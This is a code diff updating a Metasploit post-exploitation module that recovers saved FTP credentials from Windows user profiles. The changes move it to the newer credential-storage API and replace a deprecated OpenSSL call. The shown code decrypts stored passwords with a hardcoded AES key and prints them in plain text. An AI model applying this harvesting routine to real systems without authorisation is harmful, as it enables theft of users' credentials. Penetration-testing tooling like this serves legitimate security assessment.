@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -7,7 +7,7 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -49,24 +49,38 @@ class Metasploit3 < Msf::Post
           pass = decrypt(epass)
           pass = pass.gsub(/\x00/, '') if pass != nil and pass != ''
           print_good("Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")
-          if session.db_record
-            source_id = session.db_record.id
-          else
-            source_id = nil
-          end
-          auth =
-            {
-              :host => host,
-              :port => port,
-              :sname => 'ftp',
-              :user => user,
-              :pass => pass,
-              :type => 'password',
-              :source_id => source_id,
-              :source_type => "exploit",
-              :active => true
-            }
-          report_auth_info(auth)
+
+          service_data = {
+            address: host,
+            port: port,
+            service_name: 'ftp',
+            protocol: 'tcp',
+            workspace_id: myworkspace_id
+          }
+
+          credential_data = {
+              origin_type: :session,
+              session_id: session_db_id,
+              post_reference_name: self.refname,
+              private_type: :password,
+              private_data: pass,
+              username: user
+          }
+
+          credential_data.merge!(service_data)
+
+          # Create the Metasploit::Credential::Core object
+          credential_core = create_credential(credential_data)
+
+          # Assemble the options hash for creating the Metasploit::Credential::Login object
+          login_data ={
+              core: credential_core,
+              status: Metasploit::Model::Login::Status::UNTRIED
+          }
+
+          # Merge in the service data and create our Login
+          login_data.merge!(service_data)
+          login = create_credential_login(login_data)
         end
       rescue
         print_error("Cannot Access User SID: #{hive['HKU']}")
@@ -77,7 +91,7 @@ class Metasploit3 < Msf::Post
 
   def decrypt(encoded)
     cipher = [encoded].pack("H*")
-    aes = OpenSSL::Cipher::Cipher.new("AES-128-ECB")
+    aes = OpenSSL::Cipher.new("AES-128-ECB")
     aes.padding = 0
     aes.decrypt
     aes.key = "hdfzpysvpzimorhk"
